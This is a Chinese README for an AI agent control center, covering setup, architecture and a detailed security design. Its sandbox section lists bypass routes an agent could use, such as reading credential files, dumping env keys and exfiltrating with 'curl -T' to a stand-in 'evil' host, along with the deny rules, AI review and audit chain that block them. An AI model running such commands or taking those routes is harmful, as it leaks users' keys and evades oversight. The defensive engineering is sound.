# WU ai

开箱即用的全能 Personal Agent 控制中心。基于 **DeepSeek Harness（MIT）** 启动，浏览器使用，无需 Electron App。

本文件是项目**唯一文档**：使用、架构、设计规范、安全机制、维护速查、重构史全部在此。改动项目前先读对应章节；各「检查清单」是改动后的核对项。

---

## 1. 快速开始

**环境要求**：Python 3.10+（纯标准库，无需 pip install / 虚拟环境）；`start.command` 会在启动前校验版本并给出明确提示。便携 Node 由控制中心按需下载到 `runtime/`，不污染系统环境。

1. 双击 `start.command`（macOS / Linux 桌面）
2. 浏览器自动打开控制中心（本机 `http://127.0.0.1:3780`，即「单页工作台」）
3. **+ 添加模型**（云端 API 或本地模型），填 Base URL / API Key / 用途
4. 点 **启动 Agent** → 对话面就地装进同一页的执行态（不跳页、不开新标签）
5. 在对话页直接说事：路由恒为智能，Router Brain 理解任务后选模型；
   可在控制中心的 **ROUTER BRAIN** 卡指定调度模型（未指定时用回退模型）

再次使用：双击 `start.command` → 点「启动 Agent」。配置会记住。

**开发命令**

```bash
python3 tests/run_all.py            # 单元/集成/插件自测（三组，见 §11）
plugins/wu-ai-ui/build.sh           # 对话页插件：类型检查 → 构建 → 注入构建戳 → 回灌 profile
```

**两个端口**：`3780` 控制中心（Python `ThreadingHTTPServer`，占用时自动顺延备用端口）· `3080` 对话页（DSH web 进程，URL 带 `?token=` 会话凭据，落在 `data/dsh.url`，0600）。

---

## 2. 架构总览

一个自研外壳（Python 控制中心）+ 一个被改造的内核（DSH 对话面）。用户在浏览器里只看到一个**单页工作台**：发射态派活，派发即原地切到执行态，对话面内嵌在同一页。

<svg viewBox="0 0 680 694" width="100%" role="img" xmlns="http://www.w3.org/2000/svg" font-family="system-ui, -apple-system, 'PingFang SC', 'Noto Sans SC', sans-serif">
<title>WU ai 总体架构图</title>
<desc>双视图架构：左侧 Python 控制中心（3780），右侧 DSH 对话页（3080），中间为配置与数据层，底部为运行时与模型提供方。</desc>
<defs>
<marker id="arrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M2 1L8 5L2 9" fill="none" stroke="context-stroke" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></marker>
</defs>
<text x="40" y="46" font-size="14" font-weight="500" fill="#D3D1C7">WU ai 总体架构：控制面 × 数据面双视图</text>
<text x="40" y="66" font-size="12" fill="#B4B2A9">DSH 只是 Runtime Provider：WU Core 不 import DSH 内部，版本并存 + 门控升级 + 一键回滚</text>
<rect x="200" y="84" width="280" height="44" rx="8" fill="#2C2C2A" stroke="#B4B2A9" stroke-width="0.5"/>
<text x="340" y="106" font-size="13" fill="#D3D1C7" text-anchor="middle" dominant-baseline="central">浏览器 · 单页工作台（对话面内嵌）</text>
<path d="M185 128 V148" fill="none" stroke="#888780" stroke-width="1.5" marker-end="url(#arrow)"/>
<text x="192" y="143" font-size="11" fill="#B4B2A9">3780</text>
<path d="M495 128 V148" fill="none" stroke="#888780" stroke-width="1.5" marker-end="url(#arrow)"/>
<text x="502" y="143" font-size="11" fill="#B4B2A9">3080</text>
<rect x="40" y="152" width="290" height="322" rx="12" fill="#27500A" stroke="#97C459" stroke-width="0.5"/>
<text x="56" y="177" font-size="13" font-weight="500" fill="#C0DD97">控制中心 · Python · :3780</text>
<rect x="56" y="190" width="258" height="56" rx="8" fill="#173404" stroke="#97C459" stroke-width="0.5"/>
<text x="68" y="212" font-size="12" font-weight="500" fill="#C0DD97" dominant-baseline="central">server/ · HTTP API 全表</text>
<text x="68" y="231" font-size="11" fill="#97C459" dominant-baseline="central">app.py · 进程起停 · 心跳活性</text>
<rect x="56" y="258" width="258" height="56" rx="8" fill="#173404" stroke="#97C459" stroke-width="0.5"/>
<text x="68" y="280" font-size="12" font-weight="500" fill="#C0DD97" dominant-baseline="central">core/ · 控制面核心</text>
<text x="68" y="299" font-size="11" fill="#97C459" dominant-baseline="central">配置 · 密钥密库 · 健康核验 · 迁移</text>
<rect x="56" y="326" width="258" height="56" rx="8" fill="#173404" stroke="#97C459" stroke-width="0.5"/>
<text x="68" y="348" font-size="12" font-weight="500" fill="#C0DD97" dominant-baseline="central">dsh/ · DSH 集成层</text>
<text x="68" y="367" font-size="11" fill="#97C459" dominant-baseline="central">适配 · 运行时 · 升级 · 预设</text>
<rect x="56" y="394" width="258" height="56" rx="8" fill="#173404" stroke="#97C459" stroke-width="0.5"/>
<text x="68" y="416" font-size="12" font-weight="500" fill="#C0DD97" dominant-baseline="central">local_ai/ · 本地模型</text>
<text x="68" y="435" font-size="11" fill="#97C459" dominant-baseline="central">硬件检测 · llama.cpp 安装</text>
<path d="M332 310 H346" fill="none" stroke="#888780" stroke-width="1.5" marker-start="url(#arrow)" marker-end="url(#arrow)"/>
<rect x="350" y="152" width="290" height="322" rx="12" fill="#0C447C" stroke="#85B7EB" stroke-width="0.5"/>
<text x="366" y="177" font-size="13" font-weight="500" fill="#B5D4F4">对话面 · DSH · Node · :3080</text>
<rect x="366" y="190" width="258" height="56" rx="8" fill="#042C53" stroke="#85B7EB" stroke-width="0.5"/>
<text x="378" y="212" font-size="12" font-weight="500" fill="#B5D4F4" dominant-baseline="central">wu-ai-router · 数据面</text>
<text x="378" y="231" font-size="11" fill="#85B7EB" dominant-baseline="central">分析 → 选模 → 执行 → 质检 → 埋点</text>
<rect x="366" y="258" width="258" height="56" rx="8" fill="#042C53" stroke="#85B7EB" stroke-width="0.5"/>
<text x="378" y="280" font-size="12" font-weight="500" fill="#B5D4F4" dominant-baseline="central">wu-ai-ui · 客户端插件</text>
<text x="378" y="299" font-size="11" fill="#85B7EB" dominant-baseline="central">路由切换 · 调度台 · 对话页皮肤</text>
<rect x="366" y="326" width="258" height="56" rx="8" fill="#042C53" stroke="#85B7EB" stroke-width="0.5"/>
<text x="378" y="348" font-size="12" font-weight="500" fill="#B5D4F4" dominant-baseline="central">原版 DSH 插件</text>
<text x="378" y="367" font-size="11" fill="#85B7EB" dominant-baseline="central">官方 bundle 保留并存</text>
<rect x="366" y="394" width="258" height="56" rx="8" fill="#042C53" stroke="#85B7EB" stroke-width="0.5"/>
<text x="378" y="416" font-size="12" font-weight="500" fill="#B5D4F4" dominant-baseline="central">HTTP 只读通道</text>
<text x="378" y="435" font-size="11" fill="#85B7EB" dominant-baseline="central">/wu-ai/notices · /wu-ai/dashboard</text>
<path d="M185 474 V492" fill="none" stroke="#888780" stroke-width="1.5" marker-end="url(#arrow)"/>
<text x="192" y="487" font-size="11" fill="#B4B2A9">渲染写入</text>
<path d="M495 474 V492" fill="none" stroke="#888780" stroke-width="1.5" marker-end="url(#arrow)"/>
<text x="502" y="487" font-size="11" fill="#B4B2A9">读取</text>
<rect x="40" y="498" width="600" height="176" rx="12" fill="#2C2C2A" stroke="#888780" stroke-width="0.5"/>
<text x="56" y="522" font-size="13" font-weight="500" fill="#D3D1C7">底层共享层 · 配置 / 数据 / 运行时 / 模型</text>
<rect x="56" y="536" width="278" height="52" rx="8" fill="#444441" stroke="#B4B2A9" stroke-width="0.5"/>
<text x="68" y="558" font-size="12" font-weight="500" fill="#D3D1C7" dominant-baseline="central">~/.wu-ai/dsh/ · DSH 活动配置</text>
<text x="68" y="575" font-size="11" fill="#B4B2A9" dominant-baseline="central">settings · credentials · patch · perf</text>
<rect x="346" y="536" width="278" height="52" rx="8" fill="#444441" stroke="#B4B2A9" stroke-width="0.5"/>
<text x="358" y="558" font-size="12" font-weight="500" fill="#D3D1C7" dominant-baseline="central">data/ · 运行时数据（0600）</text>
<text x="358" y="575" font-size="11" fill="#B4B2A9" dominant-baseline="central">config.json · secrets.json · 指针</text>
<rect x="56" y="600" width="278" height="52" rx="8" fill="#444441" stroke="#B4B2A9" stroke-width="0.5"/>
<text x="68" y="622" font-size="12" font-weight="500" fill="#D3D1C7" dominant-baseline="central">runtime/ · 版本并存（数据）</text>
<text x="68" y="639" font-size="11" fill="#B4B2A9" dominant-baseline="central">便携 Node v22 · dsh-0.2.0 激活</text>
<rect x="346" y="600" width="278" height="52" rx="8" fill="#444441" stroke="#B4B2A9" stroke-width="0.5"/>
<text x="358" y="622" font-size="12" font-weight="500" fill="#D3D1C7" dominant-baseline="central">模型提供方 · OpenAI 兼容</text>
<text x="358" y="639" font-size="11" fill="#B4B2A9" dominant-baseline="central">云端 API · 本地 llama.cpp</text>
</svg>

对话面由控制中心以 `dsh web --no-open` 启动并内嵌（DSH 不再自己弹标签页）；抽屉 ENVIRONMENT 保留「新标签打开」作为内嵌被拦时的逃生口。

**三条设计原则**

- **防 DSH 锁定**：DSH 只是 Runtime Provider；DSH 格式知识全部收敛在 `dsh/adapter.py` 一个文件；版本并存、门控升级、失败自动回滚
- **单向依赖**：`server → core + dsh + local_ai`，`dsh → core`，无环
- **绝不伪造数据**：核验不了显示「未核验」、埋点缺值留空、工作台没数据就空状态

**两条核心数据流**：改配置走 A，改行为走 B。所有路径的单一真源在 `core/paths.py`，所有 DSH 格式的单一真源在 `dsh/adapter.py`。

<svg viewBox="0 0 680 420" width="100%" role="img" xmlns="http://www.w3.org/2000/svg" font-family="system-ui, -apple-system, 'PingFang SC', 'Noto Sans SC', sans-serif">
<title>WU ai 两条核心数据流</title>
<desc>上图：配置下发从控制中心到 DSH 的四步流程；下图：一次对话在 DSH 进程内的路由生命周期四步流程。</desc>
<defs>
<marker id="arrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M2 1L8 5L2 9" fill="none" stroke="context-stroke" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></marker>
</defs>
<text x="40" y="46" font-size="14" font-weight="500" fill="#D3D1C7">两条核心数据流</text>
<text x="40" y="66" font-size="12" fill="#B4B2A9">改配置走 A，改行为走 B；路径单一真源在 core/paths.py 与 dsh/adapter.py</text>
<rect x="40" y="84" width="600" height="150" rx="12" fill="#27500A" stroke="#97C459" stroke-width="0.5"/>
<text x="56" y="108" font-size="13" font-weight="500" fill="#C0DD97">A · 配置下发（控制中心 → DSH）</text>
<rect x="56" y="122" width="132" height="56" rx="8" fill="#173404" stroke="#97C459" stroke-width="0.5"/>
<text x="122" y="144" font-size="12" font-weight="500" fill="#C0DD97" text-anchor="middle" dominant-baseline="central">保存模型</text>
<text x="122" y="163" font-size="11" fill="#97C459" text-anchor="middle" dominant-baseline="central">控制中心页面</text>
<path d="M190 150 H198" fill="none" stroke="#888780" stroke-width="1.5" marker-end="url(#arrow)"/>
<rect x="200" y="122" width="132" height="56" rx="8" fill="#173404" stroke="#97C459" stroke-width="0.5"/>
<text x="266" y="144" font-size="12" font-weight="500" fill="#C0DD97" text-anchor="middle" dominant-baseline="central">core 落库</text>
<text x="266" y="163" font-size="11" fill="#97C459" text-anchor="middle" dominant-baseline="central">密钥进密库</text>
<path d="M334 150 H342" fill="none" stroke="#888780" stroke-width="1.5" marker-end="url(#arrow)"/>
<rect x="344" y="122" width="132" height="56" rx="8" fill="#173404" stroke="#97C459" stroke-width="0.5"/>
<text x="410" y="144" font-size="12" font-weight="500" fill="#C0DD97" text-anchor="middle" dominant-baseline="central">渲染配置</text>
<text x="410" y="163" font-size="11" fill="#97C459" text-anchor="middle" dominant-baseline="central">三件套到 DSH_HOME</text>
<path d="M478 150 H486" fill="none" stroke="#888780" stroke-width="1.5" marker-end="url(#arrow)"/>
<rect x="488" y="122" width="132" height="56" rx="8" fill="#173404" stroke="#97C459" stroke-width="0.5"/>
<text x="554" y="144" font-size="12" font-weight="500" fill="#C0DD97" text-anchor="middle" dominant-baseline="central">启动生效</text>
<text x="554" y="163" font-size="11" fill="#97C459" text-anchor="middle" dominant-baseline="central">DSH 读取配置</text>
<text x="56" y="200" font-size="11" fill="#97C459">安全 P0：密钥永不落 config.json 明文，出站响应只给掩码</text>
<rect x="40" y="250" width="600" height="150" rx="12" fill="#0C447C" stroke="#85B7EB" stroke-width="0.5"/>
<text x="56" y="274" font-size="13" font-weight="500" fill="#B5D4F4">B · 对话路由生命周期（DSH 进程内）</text>
<rect x="56" y="288" width="132" height="56" rx="8" fill="#042C53" stroke="#85B7EB" stroke-width="0.5"/>
<text x="122" y="310" font-size="12" font-weight="500" fill="#B5D4F4" text-anchor="middle" dominant-baseline="central">用户消息</text>
<text x="122" y="329" font-size="11" fill="#85B7EB" text-anchor="middle" dominant-baseline="central">pre-step 钩子</text>
<path d="M190 316 H198" fill="none" stroke="#888780" stroke-width="1.5" marker-end="url(#arrow)"/>
<rect x="200" y="288" width="132" height="56" rx="8" fill="#042C53" stroke="#85B7EB" stroke-width="0.5"/>
<text x="266" y="310" font-size="12" font-weight="500" fill="#B5D4F4" text-anchor="middle" dominant-baseline="central">分析选模</text>
<text x="266" y="329" font-size="11" fill="#85B7EB" text-anchor="middle" dominant-baseline="central">规则 + Brain</text>
<path d="M334 316 H342" fill="none" stroke="#888780" stroke-width="1.5" marker-end="url(#arrow)"/>
<rect x="344" y="288" width="132" height="56" rx="8" fill="#042C53" stroke="#85B7EB" stroke-width="0.5"/>
<text x="410" y="310" font-size="12" font-weight="500" fill="#B5D4F4" text-anchor="middle" dominant-baseline="central">排序执行</text>
<text x="410" y="329" font-size="11" fill="#85B7EB" text-anchor="middle" dominant-baseline="central">registry · multi</text>
<path d="M478 316 H486" fill="none" stroke="#888780" stroke-width="1.5" marker-end="url(#arrow)"/>
<rect x="488" y="288" width="132" height="56" rx="8" fill="#042C53" stroke="#85B7EB" stroke-width="0.5"/>
<text x="554" y="310" font-size="12" font-weight="500" fill="#B5D4F4" text-anchor="middle" dominant-baseline="central">质检埋点</text>
<text x="554" y="329" font-size="11" fill="#85B7EB" text-anchor="middle" dominant-baseline="central">verifier · perf</text>
<text x="56" y="366" font-size="11" fill="#85B7EB">贵调用每轮仅一次；unknown 不当失败，缺失值不编造</text>
</svg>

- **A 配置下发**（改模型/偏好时）：页面保存 → `core/config.py` 把密钥写进 AES 密库（`data/secrets.json`），`config.json` 只留引用 → `dsh/profile_patch.py` 把模型表、密钥引用、路由配置渲染成三件套落到 `~/.wu-ai/dsh/` → 下次「启动 Agent」时 DSH 读取生效。整条链路不碰 DSH 进程内部。
- **B 对话路由**（每次对话）：消息触发 `pre-step` 钩子 → `analyzer` 正则规则免费分类 → Router Brain 小模型做能力分析（每轮只调一次）+ `intel` 三层能力档案 → `registry` 资格过滤与评分排序（自动剔除密钥失效模型）→ `multi`（≤2 步线性）或 `planner`（DAG ≤3 步）执行 → `verifier` 用另一个模型独立质检 → 结果 inject 回对话 → `perf.jsonl` 埋点，经 `/wu-ai/dashboard` 喂调度台、经 `/api/workspace` 喂控制中心工作台。

---

## 3. 目录与文件地图

```
wu-ai/
├── start.command     # 双击启动（macOS）
├── start.py          # 薄入口：引导 sys.path → server.app.main
├── core/             # 控制面核心（纯 Python，零 DSH 知识）
│   ├── paths.py      #   路径常量单一真源（换机器/换平台只改这里）
│   ├── log.py        #   统一日志（stdout + data/launcher.log）
│   ├── config.py     #   配置读写/规范化/legacy 迁移 + 能力表
│   ├── keystore.py   #   API Key 加密存储（openssl AES-256-CBC）+ 出站脱敏
│   ├── model_health.py # 模型健康核验：密钥有效性只读探测 + 路由器共享快照
│   └── migration/    #   配置 schema 版本链（v1 明文 Key → v2 密库引用）
├── dsh/              # DSH 集成层（唯一允许知道 DSH 的 Python 代码）
│   ├── adapter.py    #   settings/credentials/profile/启动命令（唯一耦合面，纯函数）
│   ├── manager.py    #   Runtime API / 版本并存 / 兼容门控 / 切换回滚
│   ├── upgrade.py    #   升级编排（查→装→测→切→冒烟→自动回滚）+ 运行时契约冒烟
│   ├── modes.py      #   WU 预设生成（legacy + declaration 双机制；DSHY 已移除）
│   └── profile_patch.py # router 插件配置渲染 + patch 合并 + live 门控文件
├── server/           # 控制中心服务
│   ├── app.py        #   HTTP API 全表 + 静态前端 + main 启动编排
│   ├── launcher.py   #   Node/DSH 就绪、进程起停、token 管理
│   ├── workspace.py  #   工作台聚合/工作流/投递箱/沙箱自检/托管策略/风险审计/流水线事件流
│   ├── guard.py      #   沙箱路径守卫：../ 与软链接穿透拦截 + 展示路径脱敏 + 文件树 API
│   ├── shadow.py     #   影子 Git：任务快照 / 历史回看 / 单文件 diff / 一键回滚
│   ├── health.py     #   密钥核验后台刷新编排 + 共享快照同步
│   ├── credential_proxy.py # 凭据代理：DSH 与沙箱只见占位符（见 §5.3）
│   └── presence.py   #   页面心跳活性跟踪
├── local_ai/         # 硬件检测 + llama.cpp 安装
├── ui/               # 控制中心前端
│   ├── index.html    #   页面结构
│   ├── styles.css    #   样式（设计 Token，见 §7.2）
│   └── app/          #   ES modules（分域模块，结构见 §7.10）
│       ├── main.js   #     启动编排 + 左栏刷新 + 心跳
│       ├── dom.js    #     $/esc/scrubPaths/shortPath/toast/confirmAsync/api（零依赖）
│       ├── state.js  #     state 单一持有 + 徽章 + 事件总线 + fetchCatalog
│       ├── shell.js  #     单页双态：launch ↔ active（唯一的视态真源）
│       ├── pipeline.js #   执行态行内流水线（SSE + 轮询回退）+ 本轮改动胶囊
│       ├── sidebar.js #    左栏：近期任务（快照链）
│       ├── models.js #     模型舰队/弹窗/Brain 设置
│       ├── workspace.js #  抽屉数据面（工作流模板 / 风险审计）
│       ├── omni.js   #     发射台预估路由/派发（派发即切执行态）
│       ├── runtime.js #    版本并存/升级/回滚
│       ├── doctor.js #     doctor/胶囊/抽屉/首运行/托管策略表单
│       ├── trace.js  #     运行轨迹（抽屉）
│       ├── shadow.js #     TASK DIFF：当前改动 / 历史任务只读回看 / diff 查看
│       └── agent.js  #     视态与对话面装载/启动/轮询/停止/重登/退出
├── data/             # 运行时数据（0600；config.json / secrets.json / runtime-current.json / 日志）
├── plugins/          # Node 侧插件（数据面；pnpm 硬链接到 profile，勿移动）
│   ├── wu-ai-router/ #   核心路由插件（模块契约见 §6.3）
│   └── wu-ai-ui/     #   客户端插件（WU 印品牌层 · 侧栏工作台导航与面板 ·
│                     #   皮肤/文案改写；构建产物回灌 profile 后刷新生效）
├── runtime/          # 便携 Node + DSH 运行时版本目录（数据，与 dsh/ 包名无关）
└── tests/            # 测试体系（D 层单元/集成 + A/C 层兼容契约 + B 层 opt-in）
```

依赖方向（单向，无环）：`server → core + dsh + local_ai`；`dsh → core`；`core → core`。
控制中心端口 PORT 定义在 `server/app.py`（可被备用端口逻辑改写）。

> 注意：`wu-ai/.dsh/` 是早期残留目录，**不是**活动配置（活动目录在 `~/.wu-ai/dsh`），请勿修改。
> ⚠️ `plugins/` 不可移动：profile 快照是 pnpm 硬链接/symlink（目标为安装时的 store 路径），移动后需删除 profile node_modules 重新生成，否则 DSH 装载旧代码。

---

## 4. 运行时管理（防 DSH 锁定）

WU ai 不 fork DSH Core；DSH 只是 Runtime Provider，通过 Runtime API 隔离：

- **适配层**：所有 DSH 线上格式（settings.yaml / .credentials.yaml / profile bundles / 启动命令行）知识集中在 `dsh/adapter.py`；WU Core（配置模型/路由）不 import DSH 内部模块。
- **版本并存**：新版装进 `runtime/dsh/dsh-<版本>/`，绝不全量覆盖旧版；激活指针在 `data/runtime-current.json`（配置文件，不是符号链接）。
- **升级流程**：控制中心「运行时」面板 → 检查更新 → 并排安装 → A 层兼容测试（入口/版本/`--dump-config` 配置树可组装/补丁可应用，全部离线）→ 测试通过才可切换。
- **一键升级**（`/api/runtimes/upgrade`）：查最新 → 安装 → 兼容门控 → 切换 → 启动 → C 层契约冒烟（Start/Session/Preset/Tool/Model-switch + **原版插件与 wu-ai-ui 并存 bundle 契约**）→ 任一失败自动回滚上一版本。
- **回滚**：「回滚上一版本」走应急通道（不经过兼容测试），切回 previous 指针并重启。
- 切换/安装后运行时补丁自动应用到新版本目录（幂等标记，自愈）。
- **预设注册机制随版本自适应**（`dsh/modes.py`）：DSH < 0.2.0 读 `$DSH_HOME/.agent-presets/`（legacy）；**0.2.0 起该目录不再被读取**，预设改为 bundle patch 里的 `@deepseek-ai/dsh-agent-preset` 声明（declaration），以 DSH 自带的 `standard.patch.yml` 为模板派生，控制中心按激活运行时版本自动选择写法。

运行时配置在 **`~/.wu-ai/dsh/`**（DSH_HOME，避开 Desktop 权限）。文件清单见 §9。

---

## 5. 安全机制

分五层，从外到内：**沙箱自检**（确认边界真的在）→ **命令沙箱**（OS 强制，只约束写）→ **风险审查层**（应用层补读/网络/链路）→ **凭据代理**（Key 不出控制中心）→ **托管策略**（管理员基线不可覆盖）。

### 5.1 密钥生命周期

- **加密静态存储**：config.json 只保存 `apiKeySecret` 引用；明文 Key 用 openssl AES-256-CBC（PBKDF2 20 万轮）加密进 `data/secrets.json`；加密密钥是机器本地随机 hex（`~/.wu-ai/.secret`，0600），与密库分离存储。
- **启动即迁移**：schemaVersion=1 的旧配置（明文 Key）会在 load_config 时自动迁到 v2（写密库 + 删除明文 + 落盘）；迁移失败保留原文件不丢数据。
- **出站脱敏**：所有 API 响应只给 `xx…xx` 掩码形态；完整明文仅在内存中出现。删除模型会同步清掉密库中的孤儿密钥。

### 5.2 命令沙箱与风险审查层

**沙箱边界要说清**：shell 由 `dsh-bash-sandbox` 执行（macOS Seatbelt / Linux Landlock），只约束**写**——写仅限工作区（`~/WU-ai-Work`）与临时目录；**读与网络不受限**，这是 DSH 当前的设计边界，不是本项目的疏漏。写桌面/家目录会报 `file access denied under workspace-write mode`，这是安全边界，不是故障。

风险审查层（`plugins/wu-ai-router/risk-review.js`，`tools/pre-execute` 钩子）补上沙箱不管的两面。与 verifier 的职责区分：verifier 检查「结果对不对」，本层检查「这个操作该不该执行」。

**三层判断**：

1. **硬性规则**（纯代码，LLM 无权放行）：受保护路径（`~/.wu-ai/` 全部控制文件、凭据目录、项目源码树 `WUAI_HOME`）写即 deny——**人工批准了提权也不例外**（这些文件能改沙箱策略、投毒健康快照、抹审计日志，等于给自己授权）；系统特权命令（sudo/launchctl/crontab）；递归删根/家；出网 + 敏感来源/工作区外路径的组合 deny（数据外泄）。
2. **AI 审查**（仅 P2 级）：独立模型（优先与执行者不同），Packet 按**不可信数据**注入；超 3000 字符命令带 sha256 + truncated 标记，审查员看不到尾部 → 直接转人工。
3. **策略引擎终判**：allow / ask（DSH 原生人工确认）/ deny。**AI 的 ALLOW 不直接等于放行**——决策永远出自确定性规则；审查超时/格式错误/无模型 → 保守 ask，绝不因审查故障自动放行。

**权限分档**：P0 只读静默放行 / P1 工作区写与只读命令放行并审计 / P2 审查后按策略 / P3 拒绝或人工。

**已修复的绕过路径**（红队演练常驻，见 §11）：

| # | 绕过路径 | 修复 |
|---|---|---|
| 1 | `cat ~/.wu-ai/dsh/.credentials.yaml` 读明文 Key | 受保护路径前缀匹配（canonicalPath 拆软链），读也转审查 |
| 2 | `env` 一条命令取走 DSH 进程 env 里的明文 Key | 读环境变量计敏感；根治靠 §5.3 凭据代理 |
| 3 | `curl -T /tmp/x http://evil` 外传（命令内嵌路径不被提取） | `extractCmdPaths` 提取命令内嵌路径，触发组合 deny |
| 4 | `git push` / `python3 -c` / `base64\|` 等出网漏检 | `NETWORK_PATTERNS` 八组宽规则（宁可多判不可漏判） |
| 5 | `cat /etc/hosts` 被只读白名单静默放行 | 白名单「不越界」判定纳入命令内嵌路径 |
| 6 | 超长命令尾部藏 payload | 截断标记 → 审查不可用 → ask |
| 7 | 先读密钥、后外传（拆成两条命令） | 污点追踪（§5.5） |
| 8 | 删改审计日志毁灭痕迹 | 哈希链（§5.5） |

**沙箱自检**：每次打开控制中心都核对激活版本的 base bundle 是否真的挂载了 `dsh-sandbox-local` + `dsh-bash-sandbox`，并检查用户补丁有没有把它们 `disabled`。结论直接显示在 `wu doctor`：一旦被换成 `dsh-bash-local`（以宿主权限直接跑），面板会明确标为「命令执行未确认受限」，而不是继续显示「沙箱已隔离」。

### 5.3 凭据代理（Key 不出控制中心）

**问题**：上面的防线是应用层的——Key 本身还在 DSH 进程环境变量里，沙箱内 `env` 一条命令仍能取走。应用层是缓解，不是根治。

**方案**（`server/credential_proxy.py`）：模型 baseURL 指向本机代理（`http://127.0.0.1:<port>/p/<模型id>`），DSH 与沙箱只见**占位符**；真 Key 只活在控制中心进程内存，代理按「目标 host 白名单 + 每启动随机 token」注入后转发。

- token 经 settings.yaml 的 `provider.headers` 注入（`X-WU-Proxy-Token`）——DSH 的 pi-ai 适配器会把 provider 声明的 headers 合并进每个请求，且每请求重读 profile，改模型不用重启 Agent
- SSE 流式透传（`read1` 循环，不分片缓冲）；请求行用 origin-form（兼容保守网关）
- 本地模型（无 Key）不走代理：没有可保护的东西，不增加故障点
- 生命周期：`start_dsh` 前启动、`stop_dsh` 后停止、启动失败回收；代理起不来 → 大声记日志并降级直连（功能故障必须可见，不能静默失效）
- 配置变更经 `_write_dsh_config_live` 热更代理 provider 集合

控制中心 ENVIRONMENT 抽屉「凭据」行显示当前模式（代理保护中 · N 个模型 / 直连模式）。

### 5.4 托管沙箱策略（管理员基线）

`~/.wu-ai/dsh/wu-ai-policy.json`（0600），控制中心抽屉 POLICY 卡可改，Agent 侧按 mtime 热读：

- **allowedModes 白名单**：默认只放行 `workspace-write`。DSH 的 escalation（提权）形态是 bash 参数 `sandbox_permissions`（`workspace-write` / `danger-full-access`）+ justification；router 在 pre-execute 里、**DSH 弹原生审批之前**拦截白名单外的模式——Agent 侧无法覆盖管理员基线
- **预算值**：会话工具调用数（默认 200）、墙钟（默认 2h）、审查连续失败熔断（默认 5）

### 5.5 污点 / 审计 / 预算（会话级治理）

- **污点追踪**：本会话执行过敏感读取（密钥文件/环境变量）即打标（执行前标记——尝试过就是信号）；污点会话的出网命令直接转人工，跳过模型审查（跨命令链路推断，审查模型看不到会话历史）
- **审计哈希链**：`~/.wu-ai/dsh/wu-ai-risk-audit.jsonl` 每行带 `prev/h`（sha256 前 16 位），删改任意一行后续全部对不上；链头惰性从文件尾恢复（重启不断链）；写失败 pushNotice 不再静默。控制中心 RISK GUARD 卡显示计数 + 链完好状态（断裂时红色警示「第 N 行断裂，疑似篡改」）+ 最近明细。Node 写入与 Python 校验逐位对齐（有跨语言互测）
- **会话预算与熔断**：触限 → ask 提示新开会话（不 deny：误触限时用户应能自救）；审查连续失败达阈值 → 熔断，本会话后续全部转人工（审查服务可能整体不可用，继续让每个命令等 12s 超时只是浪费用户时间）。快照落 `wu-ai-budget.json` 供工作台显示

### 5.6 模型健康核验

控制中心的「就绪 / 可用」不只看有没有填 Key——`core/model_health.py` 对每个云端模型做**只读探测** `GET {baseURL}/models`（不触发推理、不消耗 token）：

| state | 含义 | 路由器行为 |
|---|---|---|
| `ok` | 鉴权通过 | 正常 |
| `auth` | 密钥失效（401/403） | **跳过**（唯一确定性失败） |
| `error` | 端点在但请求失败（限流/5xx） | 不跳过（可能只是抖动） |
| `unknown` | 判断不了（网络不通/无 /models） | 不跳过（绝不当失败） |
| `missing` | 没填 Key | 跳过 |
| `local` | 本地模型 | 不核验 |

- **指纹缓存**：`sha256(baseURL + Key)` 前缀；改 Key 或改地址即失效自动重测，绝不落盘明文
- **TTL 600s**，后台线程刷新，不阻塞开页；原子落盘
- **跨进程共享**：核验结果写 `$DSH_HOME/wu-ai-model-health.json`，路由器每轮读取，从候选里剔除密钥失效的模型（文件一改即生效，不必重启 DSH）
- CA 证书显式挑选可用 CA 包，**始终开启校验**

---

## 6. 模型与路由

### 6.1 模型（可动态添加）

- 云端 API：OpenAI 兼容，填 Base URL + Key + 模型 ID + 用途
- 本地模型：可分步「检测硬件 → 安装 llama.cpp → 选模型文件」，或直接填已有地址
- 用途为自由文本（如「视觉理解」「写代码」），原样保存，由语义匹配理解

### 6.2 路由：恒为智能（无手动模式）

- 每条消息由 Router Brain（云端或本地 llama.cpp 均可）分析任务，结合三层能力档案（declared → research → actual）排序选模，并在对话里说明选择理由
- 手动路由与「偏好」配置已于 2026-10-14 移除：不需要用户手工指定「哪个模型干哪类活」，交给 Router Brain 判断；控制中心只保留「Router Brain / 回退模型」两个下拉
- 可靠性信誉因子：有实测按实测，无样本不调整；单样本实测写入 actual 层但标 `lowConfidence` 降权（0.85），n≥2 升为全权重
- Brain 分析每轮只打一次小模型（mid-loop inject 不会导致重复调用）；质检没跑时由会话 idle 兜底补记终局样本（质检在跑时不补，防同轮双计），成功率不留盲区
- **0.2.0 事件信封适配**：`session/event` 广播的是日志信封 `{type, seq, time, data, surfaceOp}`，消息内容与用量在 `event.data` 里（`eventPayload` 统一解包）——此前直接读顶层字段导致质检/用量两条链路静默失效多月，现已在静默 return 点留诊断日志（`[diag:*]` 首见去重，不刷屏）
- **Context Manager（`context.js`）**：多模型协作的上下文独立层——TaskState（goal/约束/已确认事实/待解决问题，随 Brain 分析与质检结论更新，goal 签名变化自动重置）+ 产物仓库（子步结果全文落 `~/.wu-ai/dsh/wu-ai-context/`，摘要进入下游上下文）+ 分层构建（L1 任务摘要 + L2 上游产物摘要；硬约束永不裁剪，预算 ≈1000 tokens）。multi 子模型每次调用按需重建上下文，质检带规格约束而非完整分析。主模型对话历史不动（DSH 地盘）；请求失败全量留痕（perf kind=request-error），401 类弹 Toast 指引检查密钥
- **Planner + Scheduler（`planner.js`）**：复杂多能力任务先由强模型规划结构化任务 DAG（≤3 步、依赖、**执行前冻结的验收标准**），再由程序按拓扑波次调度（同波并行、每步执行时按能力动态选模、步失败换次优模型重分配一次、产物登记进 Context Manager）。规划失败/超时/结构非法 → 自动回退线性 multi 执行器，编排层故障不阻断任务
- **图片**：visual 模型自动放行图片提交；带图任务强制走视觉路由

### 6.3 wu-ai-router 模块契约

依赖方向（单向）：`index.js → 各模块 → perf/context/prompts`；任何模块不得反向 import index.js。修改任何模块前先读「禁止」列——它们来自实测教训与安全边界。

| 模块 | 职责 | 公开接口（主要） | 依赖 | 禁止 |
|---|---|---|---|---|
